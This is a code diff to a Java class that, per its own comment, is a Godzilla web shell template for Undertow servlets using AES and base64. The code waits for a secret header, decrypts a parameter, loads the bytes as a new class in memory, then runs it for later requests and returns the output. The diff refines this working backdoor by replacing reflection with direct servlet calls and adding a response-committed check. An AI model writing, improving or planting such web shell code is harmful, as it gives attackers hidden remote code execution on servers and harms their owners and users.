@@ -5,6 +5,8 @@ import java.io.PrintStream;
 import java.io.PrintWriter;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 /**
  * Godzilla HW UndertowServletHandler 模板（JAVA_AES_BASE64）。
@@ -47,17 +49,20 @@ public class GodzillaHwUndertowServletHandler extends ClassLoader {
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
-        String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
+        String parameter = ((HttpServletRequest) request).getParameter(pass);
         byte[] data = x(base64Decode(parameter), false);
         if (payload == null) {
             payload = this.defineClass(data, 0, data.length);
             return true;
         }
-        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        PrintWriter writer = ((HttpServletResponse) response).getWriter();
         try {
             byte[] result = execute(request, data);
             writer.write(md5.substring(0, 16));
